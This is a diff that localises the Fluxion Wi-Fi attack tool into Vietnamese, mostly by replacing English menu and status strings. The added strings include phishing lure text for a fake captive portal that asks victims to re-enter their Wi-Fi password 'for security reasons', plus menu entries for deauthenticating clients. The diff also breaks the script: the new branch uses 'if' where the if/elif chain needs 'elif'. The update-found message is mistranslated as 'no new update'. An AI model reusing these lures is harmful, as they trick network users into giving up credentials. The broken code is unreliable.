@@ -13,12 +13,12 @@ fi
 ################################
 
 if [[ $EUID -ne 0 ]]; then
-        echo -e "\e[1;31mYou don't have admin privilegies, execute the script as root.""\e[0m"""
+        echo -e "\e[1;31mBạn không có quyền quản trị, hãy thực thi Fluxion bằng quyền quản trị.""\e[0m"""
         exit 1
 fi
 
 if [ -z "${DISPLAY:-}" ]; then
-    echo -e "\e[1;31mThe script should be exected inside a X (graphical) session.""\e[0m"""
+    echo -e "\e[1;31mFluxion nên được chạy bên trong một phiên X (đồ họa).""\e[0m"""
     exit 1
 fi
 
@@ -50,18 +50,18 @@ blue="\033[1;34m"
 transparent="\e[0m"
 
 
-general_back="Back"
-general_error_1="Not_Found"
-general_case_error="Unknown option. Choose again"
-general_exitmode="Cleaning and closing"
-general_exitmode_1="Disabling monitoring interface"
-general_exitmode_2="Disabling interface"
-general_exitmode_3="Disabling "$grey"forwarding of packets"
-general_exitmode_4="Cleaning "$grey"iptables"
-general_exitmode_5="Restoring "$grey"tput"
-general_exitmode_6="Restarting "$grey"Network-Manager"
-general_exitmode_7="Cleanup performed successfully!"
-general_exitmode_8="Thanks for using fluxion"
+general_back="Quay lại"
+general_error_1="Không tìm thấy"
+general_case_error="Chọn sai. Hãy chọn lại"
+general_exitmode="Đang dọn dẹp và đóng lại"
+general_exitmode_1="Đang vô hiệu hóa chế độ moniter"
+general_exitmode_2="Đang vô hiệu hóa interface"
+general_exitmode_3="Đang vô hiệu hóa "$grey"gói chuyển tiếp"
+general_exitmode_4="Đang dọn dẹp "$grey"iptables"
+general_exitmode_5="Đang khôi phục "$grey"tput"
+general_exitmode_6="Đang khởi động lại "$grey"Network-Manager"
+general_exitmode_7="Quá trình dọn dẹp thành công!"
+general_exitmode_8="Cảm ơn bạn đã sử dụng fluxion"
 #############################################################################################
 
 # DEBUG MODE = 0 ; DEBUG MODE = 1 [Normal Mode / Developer Mode]
@@ -116,7 +116,7 @@ function spinner {
 
 # ERROR Report only in Developer Mode
 function err_report {
-	echo "Error on line $1"
+	echo "Lỗi tại dòng $1"
 }
 
 if [ $FLUX_DEBUG = 1 ]; then
@@ -248,6 +248,18 @@ DIALOG_WEB_ERROR_MSG_ENG="This field is required."
 DIALOG_WEB_LENGTH_MIN_ENG="The password must be more than {0} characters!"
 DIALOG_WEB_LENGTH_MAX_ENG="The password must be less than {0} characters!"
 DIALOG_WEB_DIR_ENG="ltr"
+
+#VI
+DIALOG_WEB_INFO_VI="Vì lý do bảo mật, nhập mật khẩu wifi để truy cập Internet."
+DIALOG_WEB_INPUT_VI="Nhập mật khẩu wifi của bạn:"
+DIALOG_WEB_SUBMIT_VI="Chấp nhận"
+DIALOG_WEB_ERROR_VI="Lỗi: Mật khẩu bạn nhập không đúng!"
+DIALOG_WEB_OK_VI="Kết nối internet sẽ được khôi phục trong giây lát."
+DIALOG_WEB_BACK_VI="Quay lại"
+DIALOG_WEB_ERROR_MSG_VI="Trường này được yêu cầu."
+DIALOG_WEB_LENGTH_MIN_VI="Mật khẩu phải chứa ít nhất {0} ký tự!"
+DIALOG_WEB_LENGTH_MAX_VI="Mật khẩu không được nhiều hơn {0} ký tự!"
+DIALOG_WEB_DIR_VI="ltr"
 
 #GER
 DIALOG_WEB_INFO_GER="Aus Sicherheitsgründen geben Sie bitte den WPA2 Schlüssel ein."
@@ -553,7 +565,7 @@ function checkdependences {
 
 	echo -ne "aircrack-ng....."
 	if ! hash aircrack-ng 2>/dev/null; then
-		echo -e "\e[1;31mNot installed"$transparent""
+		echo -e "\e[1;31mChưa được cài đặt"$transparent""
 		exit=1
 	else
 		echo -e "\e[1;32mOK!"$transparent""
@@ -562,7 +574,7 @@ function checkdependences {
 
 	echo -ne "aireplay-ng....."
 	if ! hash aireplay-ng 2>/dev/null; then
-		echo -e "\e[1;31mNot installed"$transparent""
+		echo -e "\e[1;31mChưa được cài đặt"$transparent""
 		exit=1
 	else
 		echo -e "\e[1;32mOK!"$transparent""
@@ -571,7 +583,7 @@ function checkdependences {
 
 	echo -ne "airmon-ng......."
 	if ! hash airmon-ng 2>/dev/null; then
-		echo -e "\e[1;31mNot installed"$transparent""
+		echo -e "\e[1;31mChưa được cài đặt"$transparent""
 		exit=1
 	else
 		echo -e "\e[1;32mOK!"$transparent""
@@ -580,7 +592,7 @@ function checkdependences {
 
 	echo -ne "airodump-ng....."
 	if ! hash airodump-ng 2>/dev/null; then
-		echo -e "\e[1;31mNot installed"$transparent""
+		echo -e "\e[1;31mChưa được cài đặt"$transparent""
 		exit=1
 	else
 		echo -e "\e[1;32mOK!"$transparent""
@@ -589,7 +601,7 @@ function checkdependences {
 
 	echo -ne "awk............."
 	if ! hash awk 2>/dev/null; then
-		echo -e "\e[1;31mNot installed"$transparent""
+		echo -e "\e[1;31mChưa được cài đặt"$transparent""
 		exit=1
 	else
 		echo -e "\e[1;32mOK!"$transparent""
@@ -598,7 +610,7 @@ function checkdependences {
 
 	echo -ne "bully..........."
 	if ! hash bully 2>/dev/null; then
-		echo -e "\e[1;31mNot installed"$transparent""
+		echo -e "\e[1;31mChưa được cài đặt"$transparent""
 		exit=1
 	else
 		echo -e "\e[1;32mOK!"$transparent""
@@ -607,7 +619,7 @@ function checkdependences {
 
 	echo -ne "curl............"
 	if ! hash curl 2>/dev/null; then
-		echo -e "\e[1;31mNot installed"$transparent""
+		echo -e "\e[1;31mChưa được cài đặt"$transparent""
 		exit=1
 	else
 		echo -e "\e[1;32mOK!"$transparent""
@@ -616,7 +628,7 @@ function checkdependences {
 
 	echo -ne "dhcpd..........."
 	if ! hash dhcpd 2>/dev/null; then
-		echo -e "\e[1;31mNot installed"$transparent" (isc-dhcp-server)"
+		echo -e "\e[1;31mChưa được cài đặt"$transparent" (isc-dhcp-server)"
 		exit=1
 	else
 		echo -e "\e[1;32mOK!"$transparent""
@@ -625,7 +637,7 @@ function checkdependences {
 
 	echo -ne "hostapd........."
 	if ! hash hostapd 2>/dev/null; then
-		echo -e "\e[1;31mNot installed"$transparent""
+		echo -e "\e[1;31mChưa được cài đặt"$transparent""
 		exit=1
 	else
 		echo -e "\e[1;32mOK!"$transparent""
@@ -634,7 +646,7 @@ function checkdependences {
 
 	echo -ne "iwconfig........"
 	if ! hash iwconfig 2>/dev/null; then
-		echo -e "\e[1;31mNot installed"$transparent""
+		echo -e "\e[1;31mChưa được cài đặt"$transparent""
 		exit=1
 	else
 		echo -e "\e[1;32mOK!"$transparent""
@@ -643,7 +655,7 @@ function checkdependences {
 
 	echo -ne "lighttpd........"
 	if ! hash lighttpd 2>/dev/null; then
-		echo -e "\e[1;31mNot installed"$transparent""
+		echo -e "\e[1;31mChưa được cài đặt"$transparent""
 		exit=1
 	else
 		echo -e "\e[1;32mOK!"$transparent""
@@ -652,7 +664,7 @@ function checkdependences {
 
 	echo -ne "macchanger......"
 	if ! hash macchanger 2>/dev/null; then
-		echo -e "\e[1;31mNot installed"$transparent""
+		echo -e "\e[1;31mChưa được cài đặt"$transparent""
 		exit=1
 	else
 	    echo -e "\e[1;32mOK!"$transparent""
@@ -661,7 +673,7 @@ function checkdependences {
 
 	echo -ne "mdk3............"
 	if ! hash mdk3 2>/dev/null; then
-		echo -e "\e[1;31mNot installed"$transparent""
+		echo -e "\e[1;31mChưa được cài đặt"$transparent""
 		exit=1
 
 	else
@@ -671,7 +683,7 @@ function checkdependences {
 
 	echo -ne "nmap............"
 	if ! [ -f /usr/bin/nmap ]; then
-		echo -e "\e[1;31mNot installed"$transparent""
+		echo -e "\e[1;31mChưa được cài đặt"$transparent""
 		exit=1
 	else
 		echo -e "\e[1;32mOK!"$transparent""
@@ -680,7 +692,7 @@ function checkdependences {
 
 	echo -ne "php-cgi........."
 	if ! [ -f /usr/bin/php-cgi ]; then
-		echo -e "\e[1;31mNot installed"$transparent""
+		echo -e "\e[1;31mChưa được cài đặt"$transparent""
 		exit=1
 	else
 		echo -e "\e[1;32mOK!"$transparent""
@@ -689,7 +701,7 @@ function checkdependences {
 
 	echo -ne "pyrit..........."
 	if ! hash pyrit 2>/dev/null; then
-		echo -e "\e[1;31mNot installed"$transparent""
+		echo -e "\e[1;31mChưa được cài đặt"$transparent""
 		exit=1
 	else
 		echo -e "\e[1;32mOK!"$transparent""
@@ -698,7 +710,7 @@ function checkdependences {
 
 	echo -ne "python.........."
 	if ! hash python 2>/dev/null; then
-		echo -e "\e[1;31mNot installed"$transparent""
+		echo -e "\e[1;31mChưa được cài đặt"$transparent""
 		exit=1
 	else
 		echo -e "\e[1;32mOK!"$transparent""
@@ -707,7 +719,7 @@ function checkdependences {
 
 	echo -ne "reaver.........."
 	if ! hash reaver 2>/dev/null; then
-		echo -e "\e[1;31mNot installed"$transparent""
+		echo -e "\e[1;31mChưa được cài đặt"$transparent""
 		exit=1
 	else
 		echo -e "\e[1;32mOK!"$transparent""
@@ -716,7 +728,7 @@ function checkdependences {
 
 	echo -ne "unzip..........."
 	if ! hash unzip 2>/dev/null; then
-		echo -e "\e[1;31mNot installed"$transparent""
+		echo -e "\e[1;31mChưa được cài đặt"$transparent""
 		exit=1
 	else
 		echo -e "\e[1;32mOK!"$transparent""
@@ -725,7 +737,7 @@ function checkdependences {
 
 	echo -ne "xterm..........."
 	if ! hash xterm 2>/dev/null; then
-		echo -e "\e[1;31mNot installed"$transparent""
+		echo -e "\e[1;31mChưa được cài đặt"$transparent""
 		exit=1
 	else
 		echo -e "\e[1;32mOK!"$transparent""
@@ -734,7 +746,7 @@ function checkdependences {
 
 	echo -ne "openssl........."
 	if ! hash openssl 2>/dev/null; then
-		echo -e "\e[1;31mNot installed"$transparent""
+		echo -e "\e[1;31mChưa được cài đặt"$transparent""
 		exit=1
 	else
 		echo -e "\e[1;32mOK!"$transparent""
@@ -743,7 +755,7 @@ function checkdependences {
 
 	echo -ne "rfkill.........."
         if ! hash rfkill 2>/dev/null; then
-                echo -e "\e[1;31mNot installed"$transparent""
+                echo -e "\e[1;31mChưa được cài đặt"$transparent""
                 exit=1
         else
                 echo -e "\e[1;32mOK!"$transparent""
@@ -752,7 +764,7 @@ function checkdependences {
 
         echo -ne "strings........."
         if ! hash strings 2>/dev/null; then
-                echo -e "\e[1;31mNot installed"$transparent" (binutils)"
+                echo -e "\e[1;31mChưa được cài đặt"$transparent" (binutils)"
                 exit=1
         else
                 echo -e "\e[1;32mOK!"$transparent""
@@ -761,7 +773,7 @@ function checkdependences {
 
         echo -ne "fuser..........."
         if ! hash fuser 2>/dev/null; then
-                echo -e "\e[1;31mNot installed"$transparent" (psmisc)"
+                echo -e "\e[1;31mChưa được cài đặt"$transparent" (psmisc)"
                 exit=1
         else
                 echo -e "\e[1;32mOK!"$transparent""
@@ -798,7 +810,7 @@ fi
 
 
 if [ $FLUX_DEBUG != 1 ]; then
-	whiptail --title "Fluxion Disclaimer" --msgbox "Fluxion is intended to be used for legal security purposes only, and you should only use it to protect networks/hosts you own or have permission to test. Any other use is not the responsibility of the developer(s).  Be sure that you understand and are complying with the Fluxion licenses and laws in your area.  In other words, don't be stupid, don't be an asshole and use this tool responsibly and legally." 14 60
+	whiptail --title "Fluxion Disclaimer" --msgbox "Fluxion được tạo ra chỉ sử dụng cho mục đích an ninh phù hợp với pháp luật, và bạn chỉ nên sử dụng nó để bảo vệ mạng/hosts mà bạn sở hữu hoặc có quyền để kiểm tra chúng. Bất kỳ cách sử dụng nào khác đều không thuộc trách nhiệm của (các) nhà phát triển.  Hãy chắc chắn rằng bạn hiểu và tuân thủ theo các giấy phép của Fluxion và luật pháp tại quốc gia của bạn.  Nói cách khác, đừng ngu ngốc, cũng đừng sử dụng một cái đầu đất mà hãy sử dụng công cụ này một cách có trách nhiệm và hợp pháp." 14 60
 	clear; echo ""
 		   sleep 0.01 && echo -e "$red "
            sleep 0.01 && echo -e "         ⌠▓▒▓▒   ⌠▓╗     ⌠█┐ ┌█   ┌▓\  /▓┐   ⌠▓╖   ⌠◙▒▓▒◙   ⌠█\  ☒┐    "
@@ -813,9 +825,9 @@ if [ $FLUX_DEBUG != 1 ]; then
 	sleep 0.1
 	echo -e $red"                     FLUX "$white""$version" (rev. "$green "$revision"$white") "$yellow"by "$white" deltax"
 	sleep 0.1
-	echo -e $green "           Page:"$red" https://github.com/deltaxflux/fluxion "$transparent
+	echo -e $green "           Trang:"$red" https://github.com/deltaxflux/fluxion "$transparent
 	sleep 0.1
-	echo -n "                              Latest rev."
+	echo -n "                              Cập nhật mới nhất"
 	tput civis
 	checkupdatess &
 	spinner "$!"
@@ -826,7 +838,7 @@ if [ $FLUX_DEBUG != 1 ]; then
 			if [ "$revision" -lt "$revision_online" ]; then
 				echo
 				echo
-				echo -ne $red"            New revision found! "$yellow
+				echo -ne $red"            Không có cập nhật mới! "$yellow
                 echo -ne "Update? [Y/n]: "$transparent
 				read -N1 doupdate
 				echo -ne "$transparent"
@@ -837,7 +849,7 @@ if [ $FLUX_DEBUG != 1 ]; then
 					echo
 					echo
 					echo -e ""$red"
-	Updated successfully! Restarting the script to apply the changes ..."$transparent""
+	Cập nhật thành công! Khởi động lại Fluxion để áp dụng thay đổi ..."$transparent""
 					sleep 3
 					chmod +x $0
 					exec $0
@@ -959,7 +971,7 @@ function language {
 		conditional_clear
 		top
 
-		echo -e ""$red"["$yellow"i"$red"]"$transparent" Select your language"
+		echo -e ""$red"["$yellow"i"$red"]"$transparent" Lựa chọn ngôn ngữ của bạn"
 		echo "                                       "
 		echo -e "      "$red"["$yellow"1"$red"]"$transparent" English          "
 		echo -e "      "$red"["$yellow"2"$red"]"$transparent" German      "
@@ -970,7 +982,8 @@ function language {
 		echo -e "      "$red"["$yellow"7"$red"]"$transparent" Italian   "
 		echo -e "      "$red"["$yellow"8"$red"]"$transparent" Czech   "
 		echo -e "      "$red"["$yellow"9"$red"]"$transparent" Greek   "
-        echo -e "      "$red"["$yellow"10"$red"]"$transparent" French     "        
+                echo -e "      "$red"["$yellow"10"$red"]"$transparent" French     "        
+        echo -e "      "$red"["$yellow"11"$red"]"$transparent" Vietnamese     "        
 		echo "                                       "
 		echo -n -e ""$red"["$blue"deltaxflux"$yellow"@"$white"fluxion"$red"]-["$yellow"~"$red"]"$transparent""
 		read yn
@@ -985,9 +998,10 @@ function language {
 			7 ) italian; setinterface; break;;
 			8 ) czech; setinterface; break;;
 			9 ) greek; setinterface; break;;
-            10 ) french; setinterface; break;;
+           		10 ) french; setinterface; break;;
+	    11 ) vietnamese; setinterface; break;;
 			skip ) english; skipme; break;;
-			* ) echo "Unknown option. Please choose again"; conditional_clear ;;
+			* ) echo "Chọn sai. Vui lòng chọn lại lần nữa"; conditional_clear ;;
 		  esac
 	done
 }
@@ -1148,6 +1162,57 @@ function english {
 	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
 	selection_1="Active clients"
 	selection_2="Select target. For rescan type$red r$transparent"
+	}
+
+function vietnamese {
+	header_setinterface="Chọn cart mạng"
+	setinterface_error="Không có card không dây nào, thoát..."
+
+	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+	header_choosescan="Chọn kênh"
+	choosescan_option_1="Tất cả các kênh "
+	choosescan_option_2="Kênh chỉ định"
+	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+	scanchan_option_1="Một kênh"
+	scanchan_option_2="Nhiều kênh"
+	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+	header_scan="WIFI Monitor"
+	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+	header_scanchan="Đang quét mục tiêu"
+	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+	header_askAP="Chọn kiểu tấn công"
+	askAP_option_1="FakeAP - Hostapd ("$red"Khuyến khích)"
+	askAP_option_2="FakeAP - airbase-ng (Kết nối chậm)"
+	askAP_option_4="Bruteforce - (Handshake yêu cầu phải có)"
+	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+	header_askauth="PHƯƠNG THỨC XÁC NHẬN MẬT KHẨU"
+	askauth_option_1="Handshake ("$red"Khuyến khích)"
+	askauth_option_2="Wpa_supplicant(Có khả năng thất bại)"
+	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+	header_deauthforce="Kiểm tra Handshake"
+	deauthforce_option_1="aircrack-ng (Miss chance)"
+	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+	header_deauthMENU="*Bắt Handshake*"
+	deauthMENU_option_1="Kiểm tra handshake"
+	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+	header_webinterface="Chọn tùy chọn của bạn"
+	header_ConnectionRESET="Lựa chọn trang đăng nhập"
+	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+	general_back="Quay lại"
+	general_error_1="Không_Tìm_Thấy"
+	general_case_error="Chọn sai. Hãy chọn lại"
+	general_exitmode="Đang dọn dẹp và đóng lại"
+	general_exitmode_1="Đang vô hiệu hóa chế độ moniter trên interface"
+	general_exitmode_2="Đang vô hiệu hóa interface"
+	general_exitmode_3="Đang vô hiệu hóa "$grey"gói chuyển tiếp"
+	general_exitmode_4="Đang dọn dẹp "$grey"iptables"
+	general_exitmode_5="Đang khôi phục "$grey"tput"
+	general_exitmode_6="Đăng khởi động lại "$grey"Network-Manager"
+	general_exitmode_7="Quá trình dọn dẹp thành công!"
+	general_exitmode_8="Cảm ơn đã sử dụng fluxion"
+	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+	selection_1="Các máy khách đang hoạt động"
+	selection_2="Lựa chọn mục tiêu. Cho kiểu quét lại$red r$transparent"
 	}
 
 function romanian {
@@ -1656,7 +1721,7 @@ function choosescan {
 			1 ) Scan ; break ;;
 			2 ) Scanchan ; break ;;
 			3 ) setinterface; break;;
-			* ) echo "Unknown option. Please choose again"; conditional_clear ;;
+			* ) echo "Chọn sai. Vui lòng chọn lại"; conditional_clear ;;
 		  esac
 	done
 }
@@ -1703,8 +1768,8 @@ function selection {
 	if [ "$LINEAS_WIFIS_CSV" = "" ];then
 		conditional_clear
 		top
-		echo -e ""$red"["$yellow"i"$red"]"$transparent" Error: your wireless card  isn't supported  "
-		echo -n -e $transparent"Do you want exit? "$red"["$yellow"Y"$transparent"es / "$yellow"N"$transparent"o"$red"]"$transparent":"
+		echo -e ""$red"["$yellow"i"$red"]"$transparent" Lỗi: Card mạng của bạn không được hỗ trợ  "
+		echo -n -e $transparent"Bạn muốn thoát? "$red"["$yellow"Y"$transparent"es / "$yellow"N"$transparent"o"$red"]"$transparent":"
 		read back
 		if [ $back = 'n' ] && [ $back = 'N' ] && [ $back = 'no' ] && [ $back = 'No' ];then
 			clear && exitmode
@@ -1723,7 +1788,7 @@ function selection {
 	fluxionap=`expr $fluxionap - 1`
 	head -n $fluxionap $DUMP_PATH/$CSVDB &> $DUMP_PATH/dump-02.csv
 	tail -n +$fluxionap $DUMP_PATH/$CSVDB &> $DUMP_PATH/clientes.csv
-	echo "                        WIFI LIST "
+	echo "                        DANH SÁCH WIFI "
 	echo ""
 	echo " ID      MAC                      CHAN    SECU     PWR   ESSID"
 	echo ""
@@ -1864,7 +1929,7 @@ function handshakelocation {
 	infoap
 	if [ -f "/root/handshakes/$Host_SSID2-$Host_MAC.cap" ]; then
 		echo -e "Handshake $yellow$Host_SSID-$Host_MAC.cap$transparent found in /root/handshakes."
-		echo -e "${red}Do you want to use this file? (y/N)"
+		echo -e "${red}Bạn có muốn sử dụng tập tin này không? (y/N)"
 		echo -ne "$transparent"
 		read usehandshakefile
 		if [ "$usehandshakefile" = "y" -o "$usehandshakefile" = "Y" ]; then
@@ -1902,10 +1967,10 @@ function handshakelocation {
 						cp "$handshakeloc" $DUMP_PATH/$Host_MAC-01.cap
 						certssl
 					else
-					echo -e $yellow "Corrupted handshake" $transparent
+					echo -e $yellow "Handshake bị hỏng" $transparent
 					echo
 					sleep 2
-					echo "Do you want to try aicrack-ng instead of pyrit to verify the handshake? [ENTER = NO]"
+					echo "Bạn có muốn dùng aicrack-ng thay cho pyrit để kiểm tra Handshake? [ENTER = NO]"
 					echo
 
 					read handshakeloc_aircrack
@@ -1917,7 +1982,7 @@ function handshakelocation {
 							cp "$handshakeloc" $DUMP_PATH/$Host_MAC-01.cap
 						 	certssl
 						else
-							echo "Corrupted handshake"
+							echo "Handshake bị hỏng"
 							sleep 2
 							handshakelocation
 						fi
@@ -1991,11 +2056,11 @@ function askclientsel {
 
 		echo -e ""$red"["$yellow"i"$red"]"$transparent" $header_deauthMENU"
 		echo "                                       "
-		echo -e "      "$red"["$yellow"1"$red"]"$transparent" Deauth all"
-		echo -e "      "$red"["$yellow"2"$red"]"$transparent" Deauth all [mdk3]"
-		echo -e "      "$red"["$yellow"3"$red"]"$transparent" Deauth target "
-		echo -e "      "$red"["$yellow"4"$red"]"$transparent" Rescan networks "
-		echo -e "      "$red"["$yellow"5"$red"]"$transparent" Exit"
+		echo -e "      "$red"["$yellow"1"$red"]"$transparent" Từ chối tất cả "
+		echo -e "      "$red"["$yellow"2"$red"]"$transparent" Từ chối tất cả [mdk3]"
+		echo -e "      "$red"["$yellow"3"$red"]"$transparent" Từ chối mục tiêu chỉ định "
+		echo -e "      "$red"["$yellow"4"$red"]"$transparent" Quét lại mạng wifi "
+		echo -e "      "$red"["$yellow"5"$red"]"$transparent" Thoát"
 		echo "                                       "
 		echo -n -e ""$red"["$blue"deltaxflux"$yellow"@"$white"fluxion"$red"]-["$yellow"~"$red"]"$transparent""
 		read yn
@@ -2073,9 +2138,9 @@ function deauthMENU {
 		echo -e "Status handshake: $Handshake_statuscheck"
 		echo
 		echo -e "      "$red"["$yellow"1"$red"]"$transparent" $deauthMENU_option_1"
-		echo -e "      "$red"["$yellow"2"$red"]"$transparent" $general_back (Select another deauth method)"
-		echo -e "      "$red"["$yellow"3"$red"]"$transparent" Select another network"
-		echo -e "      "$red"["$yellow"4"$red"]"$transparent" Exit"
+		echo -e "      "$red"["$yellow"2"$red"]"$transparent" $general_back (Chọn một phương thức từ chối khác)"
+		echo -e "      "$red"["$yellow"3"$red"]"$transparent" Chọn mạng khác"
+		echo -e "      "$red"["$yellow"4"$red"]"$transparent" Thoát"
 		echo -n '      #> '
 		read yn
 
@@ -2098,7 +2163,7 @@ function capture {
 	if ! ps -A | grep -q airodump-ng; then
 
 		rm -rf $DUMP_PATH/$Host_MAC*
-		xterm $HOLD -title "Capturing data on channel --> $Host_CHAN" $TOPRIGHT -bg "#000000" -fg "#FFFFFF" -e airodump-ng --ignore-negative-one --bssid $Host_MAC -w $DUMP_PATH/$Host_MAC -c $Host_CHAN -a $WIFI_MONITOR &
+		xterm $HOLD -title "Đang bắt dữ liệu trên kênh --> $Host_CHAN" $TOPRIGHT -bg "#000000" -fg "#FFFFFF" -e airodump-ng --ignore-negative-one --bssid $Host_MAC -w $DUMP_PATH/$Host_MAC -c $Host_CHAN -a $WIFI_MONITOR &
 	fi
 }
 
@@ -2114,7 +2179,7 @@ function checkhandshake {
 			break
 
 		else
-			Handshake_statuscheck="${red}Not_Found$transparent"
+			Handshake_statuscheck="${red}Không_Tìm_Thấy$transparent"
 
 		fi
 	elif [ "$handshakemode" = "hard" ]; then
@@ -2156,11 +2221,11 @@ function certssl {
 		conditional_clear
 		top
 		echo "                                       "
-		echo -e ""$red"["$yellow"i"$red"]"$transparent" Certificate invalid or not present, please choose an option"
+		echo -e ""$red"["$yellow"i"$red"]"$transparent" Chứng chỉ không hợp lệ hoặc không sẵn sàng, vui lòng chọn một lựa chọn"
 		echo "                                       "
-		echo -e "      "$red"["$yellow"1"$red"]"$transparent" Create a SSL certificate"
-		echo -e "      "$red"["$yellow"2"$red"]"$transparent" Search for SSL certificate" # hop to certssl check again
-		echo -e "      "$red"["$yellow"3"$red"]"$red" Exit" $transparent
+		echo -e "      "$red"["$yellow"1"$red"]"$transparent" Tạo chứng chỉ SSL"
+		echo -e "      "$red"["$yellow"2"$red"]"$transparent" Tìm kiếm chứng chỉ SSL" # hop to certssl check again
+		echo -e "      "$red"["$yellow"3"$red"]"$red" Thoát" $transparent
 		echo " "
 		echo -n '      #> '
 		read yn
@@ -2177,11 +2242,11 @@ function certssl {
 		conditional_clear
 		top
 		echo "                                    	                            "
-		echo "  Certificate invalid or not present, please choice"
+		echo "  Chứng chỉ không hợp lệ hoặc không sẵn sàng, vui lòng chọn"
 		echo "                                       "
-		echo -e "      "$red"["$yellow"1"$red"]"$transparent" Create  a SSL certificate"
-		echo -e "      "$red"["$yellow"2"$red"]"$transparent" Search for SSl certificate" # hop to certssl check again
-		echo -e "      "$red"["$yellow"3"$red"]"$red" Exit" $transparent
+		echo -e "      "$red"["$yellow"1"$red"]"$transparent" Tạo chứng chỉ SSL"
+		echo -e "      "$red"["$yellow"2"$red"]"$transparent" Tìm kiếm chứng chỉ SSL" # hop to certssl check again
+		echo -e "      "$red"["$yellow"3"$red"]"$red" Thoát" $transparent
 		echo " "
 		echo -n '      #> '
 		read yn
@@ -2202,7 +2267,7 @@ function certssl {
 
 # Create Self-Signed SSL Certificate
 function creassl {
-	xterm -title "Create Self-Signed SSL Certificate" -e openssl req -subj '/CN=SEGURO/O=SEGURA/OU=SEGURA/C=US' -new -newkey rsa:2048 -days 365 -nodes -x509 -keyout /$DUMP_PATH/server.pem -out /$DUMP_PATH/server.pem # more details there https://www.openssl.org/docs/manmaster/apps/openssl.html
+	xterm -title "Tạo chứng chỉ Self-Signed SSL Certificate" -e openssl req -subj '/CN=SEGURO/O=SEGURA/OU=SEGURA/C=US' -new -newkey rsa:2048 -days 365 -nodes -x509 -keyout /$DUMP_PATH/server.pem -out /$DUMP_PATH/server.pem # more details there https://www.openssl.org/docs/manmaster/apps/openssl.html
 	certssl
 }
 
@@ -2222,9 +2287,9 @@ function webinterface {
 		echo
 		echo -e ""$red"["$yellow"i"$red"]"$transparent" $header_webinterface"
 		echo
-		echo -e "      "$red"["$yellow"1"$red"]"$transparent" Web Interface"
+		echo -e "      "$red"["$yellow"1"$red"]"$transparent" Giao diện web"
 		echo -e "      "$red"["$yellow"2"$red"]"$transparent" Bruteforce"
-		echo -e "      "$red"["$yellow"3"$red"]"$transparent" \e[1;31mExit"$transparent""
+		echo -e "      "$red"["$yellow"3"$red"]"$transparent" \e[1;31mThoát"$transparent""
 		echo
 		echo -n "#? "
 		read yn
@@ -2270,6 +2335,7 @@ function ConnectionRESET {
       		echo -e "      "$red"["$yellow"$n"$red"]"$transparent" Hebrew      [HE]   (NEUTRA)";n=`expr $n + 1`
       		echo -e "      "$red"["$yellow"$n"$red"]"$transparent" Thai        [TH]   (NEUTRA)";n=`expr $n + 1`
             echo -e "      "$red"["$yellow"$n"$red"]"$transparent" Portuguese - Brazilian (NEUTRA)";n=`expr $n + 1`
+			echo -e "      "$red"["$yellow"$n"$red"]"$transparent" Vietnamese  [VI]   (NEUTRA)";n=`expr $n + 1`
             echo -e "      "$red"["$yellow"$n"$red"]"$transparent" Belkin      [ENG]";n=`expr $n + 1`
 			echo -e "      "$red"["$yellow"$n"$red"]"$transparent" Netgear     [ENG]";n=`expr $n + 1`
 			echo -e "      "$red"["$yellow"$n"$red"]"$transparent" Huawei      [ENG]";n=`expr $n + 1`
@@ -2626,68 +2692,82 @@ function ConnectionRESET {
                                 NEUTRA
                                 break
 
-			elif [ "$fluxass" = "25" ]; then
+			if [ "$fluxass" = "25" ]; then
+				DIALOG_WEB_ERROR=$DIALOG_WEB_ERROR_VI
+				DIALOG_WEB_INFO=$DIALOG_WEB_INFO_VI
+				DIALOG_WEB_INPUT=$DIALOG_WEB_INPUT_VI
+				DIALOG_WEB_OK=$DIALOG_WEB_OK_VI
+				DIALOG_WEB_SUBMIT=$DIALOG_WEB_SUBMIT_VI
+				DIALOG_WEB_BACK=$DIALOG_WEB_BACK_VI
+				DIALOG_WEB_ERROR_MSG=$DIALOG_WEB_ERROR_MSG_VI
+				DIALOG_WEB_LENGTH_MIN=$DIALOG_WEB_LENGTH_MIN_VI
+				DIALOG_WEB_LENGTH_MAX=$DIALOG_WEB_LENGTH_MAX_VI
+				DIALOG_WEB_DIR=$DIALOG_WEB_DIR_VI
+				NEUTRA
+				break
+				
+			elif [ "$fluxass" = "26" ]; then
 				BELKIN
 				break
 
 
-			elif [ "$fluxass" = "26" ]; then
+			elif [ "$fluxass" = "27" ]; then
 				NETGEAR
 				break
 
-			elif [ "$fluxass" = "27" ]; then
+			elif [ "$fluxass" = "28" ]; then
 				HUAWEI
 				break
 
-			elif [ "$fluxass" = "28" ]; then
+			elif [ "$fluxass" = "29" ]; then
 				VERIZON
 				break
 
-			elif [ "$fluxass" = "29" ]; then
+			elif [ "$fluxass" = "30" ]; then
